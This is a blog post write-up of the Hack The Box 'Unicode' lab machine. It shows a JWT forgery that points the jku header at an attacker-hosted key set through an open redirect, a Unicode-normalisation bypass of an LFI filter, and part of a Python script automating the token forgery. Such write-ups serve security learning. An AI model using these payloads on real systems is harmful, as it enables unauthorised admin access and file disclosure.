<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox - Unicode" /><meta property="og:locale" content="en" /><meta name="description" content="Just another hackthebox writeups website powered by poorduck" /><meta property="og:description" content="Just another hackthebox writeups website powered by poorduck" /><link rel="canonical" href="https://x00tex.github.io/posts/unicode/" /><meta property="og:url" content="https://x00tex.github.io/posts/unicode/" /><meta property="og:site_name" content="Poorduck" /><meta property="og:image" content="https://x00tex.github.io/assets/img/posts/unicode/unicode_banner.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-12-01T18:30:00+00:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://x00tex.github.io/assets/img/posts/unicode/unicode_banner.png" /><meta property="twitter:title" content="Hackthebox - Unicode" /><meta name="twitter:site" content="@p00rduck" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-12-01T18:30:00+00:00","datePublished":"2021-12-01T18:30:00+00:00","description":"Just another hackthebox writeups website powered by poorduck","headline":"Hackthebox - Unicode","image":"https://x00tex.github.io/assets/img/posts/unicode/unicode_banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://x00tex.github.io/posts/unicode/"},"url":"https://x00tex.github.io/posts/unicode/"}</script><title>Hackthebox - Unicode | Poorduck</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Poorduck"><meta name="application-name" content="Poorduck"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/poorduck.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Poorduck</a></div><div class="site-subtitle font-italic">Kwak kwak</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/x00tex" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/p00rduck" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['x00tex-writeups.3us6n','simplelogin.co'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox - Unicode</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox - Unicode</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/p00rduck">p00rduck</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1638383400" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2021-12-01 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1656 words"> <em>9 min</em> read</span></div></div></div><div class="post-content"><p><img data-src="/assets/img/posts/unicode/unicode_banner.png" alt="" data-proofer-ignore></p><p align="right"> <a href="https://www.hackthebox.eu/home/users/profile/391067" target="_blank"><img loading="lazy" alt="x00tex" data-src="https://www.hackthebox.eu/badge/image/391067" data-proofer-ignore></a></p><h1 id="enumeration">Enumeration</h1><p><strong>IP-ADDR:</strong> 10.10.11.126 hackmedia.htb</p><p><strong>nmap scan:</strong></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 <span class="o">(</span>RSA<span class="o">)</span>
|   256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-favicon: Unknown favicon MD5: E06EE2ACCCCCD12A0FD09983B44FE9D9
|_http-generator: Hugo 0.83.1
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Hackmedia
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</pre></table></code></div></div><p>web app hava login and register option and <code class="language-plaintext highlighter-rouge">/redirect</code> looks like a open redirect on not useful right now.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>❯ <span class="nb">echo </span>http://<span class="nv">$ip</span> | hakrawler
http://10.10.11.126/
http://10.10.11.126/login/
http://10.10.11.126/register/
http://10.10.11.126/redirect/?url<span class="o">=</span>google.com
</pre></table></code></div></div><p>register with new account and logged,</p><p><img data-src="/assets/img/posts/unicode/webapp-logged-in.png" alt="" data-proofer-ignore></p><p>One thing to be noted that, it is possible to enumerate exist users with some scripting/burp-intruder because application gives explicit error message if user already exists.</p><p><img data-src="/assets/img/posts/unicode/user-enum.png" alt="" data-proofer-ignore></p><p>There are some functionalities but looks like none of them really works, only one thing looks interesting is the cookie which contains a auth token.</p><p><img data-src="/assets/img/posts/unicode/auth-token.png" alt="" data-proofer-ignore></p><h1 id="foothold">Foothold</h1><h2 id="jwt-jku-bypass"><span class="mr-2">JWT jku bypass</span><a href="#jwt-jku-bypass" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>looks like a jwt token</p><p><img data-src="/assets/img/posts/unicode/jwt-tool-decode.png" alt="" data-proofer-ignore></p><p>Token contains jku value: <code class="language-plaintext highlighter-rouge">jku = "http://hackmedia.htb/static/jwks.json"</code></p><ul><li>Got a hostname: <code class="language-plaintext highlighter-rouge">hackmedia.htb</code><li>jku stands for JWK Set URL.<ul><li><p>jku Header points to a URL containing the JWKS file that holds the Public Key for verifying the token.</p><p><img data-src="/assets/img/posts/unicode/jwks-file.png" alt="" data-proofer-ignore></p></ul></ul><p>There is a way to bypass token verification from jku header: https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#jku</p><p>For the, we need to create a public-private key and a jwks file hosted on our server.</p><p>First you need to create a new certificate with new private &amp; public keys -</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>openssl genrsa <span class="nt">-out</span> keypair.pem 2048
openssl rsa <span class="nt">-in</span> keypair.pem <span class="nt">-pubout</span> <span class="nt">-out</span> publickey.crt
openssl pkcs8 <span class="nt">-topk8</span> <span class="nt">-inform</span> PEM <span class="nt">-outform</span> PEM <span class="nt">-nocrypt</span> <span class="nt">-in</span> keypair.pem <span class="nt">-out</span> pkcs8.key
</pre></table></code></div></div><p>Then to create the new JWT with the created <code class="language-plaintext highlighter-rouge">publickey.crt</code>(public) and <code class="language-plaintext highlighter-rouge">pkcs8.key</code>(private) keys and pointing the parameter jku to the certificate created.</p><p><strong>HEADER</strong></p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"typ"</span><span class="p">:</span><span class="s2">"JWT"</span><span class="p">,</span><span class="nl">"alg"</span><span class="p">:</span><span class="s2">"RS256"</span><span class="p">,</span><span class="nl">"jku"</span><span class="p">:</span><span class="s2">"http://attacker.server/jwks.json"</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p><strong>PAYLOAD</strong></p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"user"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p><img data-src="/assets/img/posts/unicode/generate-token.png" alt="" data-proofer-ignore></p><p>In order to create a valid jku certificate you can download the original one and change the needed parameters.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wget http://hackmedia.htb/static/jwks.json
</pre></table></code></div></div><p>You can obtain the parameter “<code class="language-plaintext highlighter-rouge">e</code>” and “<code class="language-plaintext highlighter-rouge">n</code>” from a public certificate using python -</p><ul><li>There is a issue with formatting hacktricks shows this value in hex format but our target server using possibly base64 format. We can still get these values with python but with different module and different techniques.<div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">jwcrypto</span> <span class="kn">import</span> <span class="n">jwk</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"keypair.pem"</span><span class="p">,</span> <span class="s">"rb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">pemfile</span><span class="p">:</span>
  <span class="n">key</span> <span class="o">=</span> <span class="n">jwk</span><span class="p">.</span><span class="n">JWK</span><span class="p">.</span><span class="n">from_pem</span><span class="p">(</span><span class="n">pemfile</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>
<span class="n">jwks</span> <span class="o">=</span> <span class="n">key</span><span class="p">.</span><span class="n">export_public</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">jwks</span><span class="p">)[</span><span class="s">'n'</span><span class="p">])</span>
<span class="k">print</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">jwks</span><span class="p">)[</span><span class="s">'e'</span><span class="p">])</span>
</pre></table></code></div></div></ul><p><img data-src="/assets/img/posts/unicode/get-e-n.png" alt="" data-proofer-ignore></p><p>Replace <code class="language-plaintext highlighter-rouge">e</code> and <code class="language-plaintext highlighter-rouge">n</code> value in original <code class="language-plaintext highlighter-rouge">jwks.json</code> with new values.</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="w">
    </span><span class="nl">"keys"</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="w">
        </span><span class="p">{</span><span class="w">
            </span><span class="nl">"kty"</span><span class="p">:</span><span class="w"> </span><span class="s2">"RSA"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"use"</span><span class="p">:</span><span class="w"> </span><span class="s2">"sig"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"kid"</span><span class="p">:</span><span class="w"> </span><span class="s2">"hackthebox"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"alg"</span><span class="p">:</span><span class="w"> </span><span class="s2">"RS256"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"n"</span><span class="p">:</span><span class="w"> </span><span class="s2">"5VB6YkmCCvY7UTdKNh4jUSxySy8Kew9A_ZIb3zilwMzXOgg8gThoicyR9pQmpjKrNWYz3eBueDkkjc7gHaN7H97rbpZq01NxsKGxWGqgO7JVSjq0o_YLPBztGFZ-R0tqZ-wzObuL8ZDnbm0vWdgFtxSVNAGB8eL0S-t9wMY6ALz8KXbYyWarH1FJpgYFtzrYRE6oJQsPCfgCzWIkKEV-dUyAcn7B2sVKjceEsI1JoKonQU4X6RJmU8PHFcjFqix2_fWUhVhLjVcKDHDNECY-h3jfd-1j_m0Na1F5eP87s_hSLdJVkaIiI4v6lOpFR7BxbN-UN9aCo_PE8thW3TavSw"</span><span class="p">,</span><span class="w">
            </span><span class="nl">"e"</span><span class="p">:</span><span class="w"> </span><span class="s2">"AQAB"</span><span class="w">
        </span><span class="p">}</span><span class="w">
    </span><span class="p">]</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>Now, Host that <code class="language-plaintext highlighter-rouge">jwks.json</code> file on http server And GET request to <code class="language-plaintext highlighter-rouge">/dashboard</code> with modified auth token but got validation error: <strong>jku validation failed</strong>.</p><p><img data-src="/assets/img/posts/unicode/jku-valid-error.png" alt="" data-proofer-ignore></p><p>That means there are some filters and black/white list that preventing this.</p><p>Found this on google which remind me something: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/jwt-forgery-via-chaining-jku-parameter-with-open-redirect-/</p><p>At the beginning i notice a open redirect from <code class="language-plaintext highlighter-rouge">http://10.10.11.126/redirect/?url=google.com</code>. We can use it and try to bypass that filter.</p><p>After some testing i found out possible filters.</p><ul><li>Application explicitly checks for <code class="language-plaintext highlighter-rouge">http://hackmedia.htb/static/</code><li>Does not support any other port besides port 80.</ul><p>Possible way to bypass.</p><ul><li>use <code class="language-plaintext highlighter-rouge">../</code> after <code class="language-plaintext highlighter-rouge">static/</code> to go back to <code class="language-plaintext highlighter-rouge">/redirect</code><li>run http server with port 80</ul><p>Final jwt token payload and header looks like this; Get new token with these values.</p><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"typ"</span><span class="p">:</span><span class="s2">"JWT"</span><span class="p">,</span><span class="nl">"alg"</span><span class="p">:</span><span class="s2">"RS256"</span><span class="p">,</span><span class="nl">"jku"</span><span class="p">:</span><span class="s2">"http://hackmedia.htb/static/../redirect/?url=10.10.14.24/jwks.json"</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><div class="language-json highlighter-rouge"><div class="code-header"> <span data-label-text="JSON"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{</span><span class="nl">"user"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">}</span><span class="w">
</span></pre></table></code></div></div><p>And finally got the admin panel</p><p><img data-src="/assets/img/posts/unicode/admin-dash.png" alt="" data-proofer-ignore></p><h2 id="lfi"><span class="mr-2">lfi</span><a href="#lfi" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>There are only two working link on the admin dashboard. Both has same directory and parameter only value is different</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>http://hackmedia.htb/display/?page<span class="o">=</span>monthly.pdf
http://hackmedia.htb/display/?page<span class="o">=</span>quarterly.pdf
</pre></table></code></div></div><p>based on the parameter values, this could be a lfi bug.</p><p>Tried some <code class="language-plaintext highlighter-rouge">../../</code> and immediately redirect to <code class="language-plaintext highlighter-rouge">/filenotfound</code> with a message: “we do a lot input filtering you can never bypass our filters.Have a good day”</p><p><img data-src="/assets/img/posts/unicode/lfi-filter.png" alt="" data-proofer-ignore></p><p>That means this is a lfi but there are some filters we need to bypass.</p><ul><li>Good resourse on WAF bypass: https://jlajara.gitlab.io/web/2020/02/19/Bypass_WAF_Unicode.html</ul><p>And based on the box name, successfully bypass WAF with unicode character <code class="language-plaintext highlighter-rouge">︰</code> which Normalization as <code class="language-plaintext highlighter-rouge">..</code></p><p><img data-src="/assets/img/posts/unicode/lfi-bypassed.png" alt="" data-proofer-ignore></p><p>sake of the learning purpose, i tried to create a python script to automate all of this.</p><div class="language-py highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">jwt</span>
<span class="kn">import</span> <span class="nn">json</span>
<span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
<span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="n">r</span>
<span class="kn">from</span> <span class="nn">jwcrypto</span> <span class="kn">import</span> <span class="n">jwk</span>
<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">re</span>
<span class="kn">import</span> <span class="nn">netifaces</span> <span class="k">as</span> <span class="n">ni</span>
<span class="c1"># from os import getcwd
</span>
<span class="n">host</span> <span class="o">=</span> <span class="s">'http://hackmedia.htb'</span>  <span class="c1"># **IMPORTANT** add "10.10.11.126 hackmedia.htb" in "/etc/hosts" file.
</span><span class="n">files_path</span> <span class="o">=</span> <span class="s">'.'</span>  <span class="c1"># getcwd()
</span><span class="n">ip</span> <span class="o">=</span> <span class="n">ni</span><span class="p">.</span><span class="n">ifaddresses</span><span class="p">(</span><span class="s">'tun0'</span><span class="p">)[</span><span class="n">ni</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s">'addr'</span><span class="p">]</span>
<span class="n">jwks_serv_ip</span> <span class="o">=</span> <span class="n">ip</span>


<span class="k">class</span> <span class="nc">GenTokenAndJWKS</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="c1"># Generate RSA key
</span>        <span class="n">key</span> <span class="o">=</span> <span class="n">RSA</span><span class="p">.</span><span class="n">generate</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
        <span class="n">private_key</span> <span class="o">=</span> <span class="n">key</span><span class="p">.</span><span class="n">exportKey</span><span class="p">(</span><span class="s">'PEM'</span><span class="p">)</span>
        <span class="n">public_key</span> <span class="o">=</span> <span class="n">key</span><span class="p">.</span><span class="n">publickey</span><span class="p">().</span><span class="n">exportKey</span><span class="p">(</span><span class="s">'PEM'</span><span class="p">)</span>
        <span class="c1"># Extract "n" and "e" value
</span>        <span class="n">key</span> <span class="o">=</span> <span class="n">jwk</span><span class="p">.</span><span class="n">JWK</span><span class="p">.</span><span class="n">from_pem</span><span class="p">(</span><span class="n">public_key</span><span class="p">)</span>
        <span class="n">jwks</span> <span class="o">=</span> <span class="n">key</span><span class="p">.</span><span class="n">export_public</span><span class="p">()</span>
        <span class="c1"># print(json.loads(jwks))
</span>
        <span class="c1"># Generate modified "jwks.json" file
</span>        <span class="n">org_jwks</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s">/static/jwks.json'</span><span class="p">).</span><span class="n">text</span>
        <span class="c1"># print(org_jwks)
</span>        <span class="n">json_object</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">org_jwks</span><span class="p">)</span>
        <span class="n">json_object</span><span class="p">[</span><span class="s">'keys'</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s">'n'</span><span class="p">]</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">jwks</span><span class="p">)[</span><span class="s">'n'</span><span class="p">]</span>
        <span class="n">json_object</span><span class="p">[</span><span class="s">'keys'</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="s">'e'</span><span class="p">]</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">jwks</span><span class="p">)[</span><span class="s">'e'</span><span class="p">]</span>
        <span class="c1"># print(json.dumps(json_object, indent=4))
</span>        <span class="bp">self</span><span class="p">.</span><span class="n">modified_jwks</span> <span class="o">=</span> <span class="n">json_object</span>

        <span class="c1"># Using Open redirect to bypass jku validation
</span>        <span class="n">jwks_server</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"</span><span class="si">{</span><span class="n">host</span><span class="si">}</span><span class="s">/static/../redirect/?url=</span><span class="si">{</span><span class="n">jwks_serv_ip</span><span class="si">}</span><span class="s">/jwks.json"</span>
        <span class="c1"># Generate jwt token
</span>        <span class="bp">self</span><span class="p">.</span><span class="n">jwt_token</span> <span class="o">=</span> <span class="n">jwt</span><span class="p">.</span><span class="n">encode</span><span class="p">({</span><span class="s">"user"</span><span class="p">:</span> <span class="s">"admin"</span><span class="p">},</span> <span class="n">private_key</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s">"RS256"</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s">"jku"</span><span class="p">:</span> <span class="n">jwks_server</span><span class="p">})</span>
        <span class="c1"># print(self.jwt_token)
</span>        <span class="c1"># decoded = jwt.decode(jwt_token, public_key, algorithms=["RS256"])
</span>        <span class="c1"># print(decoded)
</span>

<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">()</span>
<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--genFiles'</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s">'store_true'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"Generate jwks.json and token."</span><span class="p">)</span>
<span class="n">parser</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'--lfi'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">"lfi attack."</span><span class="p">)</span>
<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>


